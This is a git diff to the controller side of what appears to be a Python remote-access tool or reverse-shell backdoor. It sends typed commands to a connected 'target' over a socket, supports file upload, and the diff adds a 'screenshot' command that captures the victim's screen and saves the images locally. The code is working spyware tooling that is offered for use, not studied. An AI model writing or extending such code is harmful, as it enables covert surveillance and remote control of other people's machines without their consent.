@@ -12,6 +12,18 @@ def reliable_send(data):
     target.send(json_data.encode())
 
 
+def reliable_recv_image():
+    data = b""
+    BUFF_SIZE = 4096
+    while True:
+        
+        data_recv = target.recv(BUFF_SIZE)
+        data += data_recv
+        if len(data_recv) < BUFF_SIZE:
+            break
+    return data
+
+
 def reliable_recv():
     data = ""
     while True:
@@ -24,10 +36,11 @@ def reliable_recv():
             continue
 
 def concatenateUploadMessageAndFileUploadContent(command, content):
-    return command + " | " + content + "je suis"
+    return command + " | " + content
 
 
 def shell():
+    count_screen = 1
     while True:
         command = input("Shell#~{}:".format(ip))
         print("command -> {}".format(command))
@@ -56,6 +69,16 @@ def shell():
                 print("apres l'envoi du content")
             #except:
             #    reliable_send("Faiiled to Upload")
+        elif len(command) > 1 and command[:10] == "screenshot":
+           reliable_send(command)
+           with open("screenshot{}.png".format(count_screen), "wb") as screen:
+                image = reliable_recv_image()
+                if image[:3] == "[-]":
+                    print("Error -> {}".format(image))
+                else:
+                    print(image)
+                    screen.write(image)
+                    count_screen += 1
         else:
             reliable_send(command)
             message = reliable_recv()
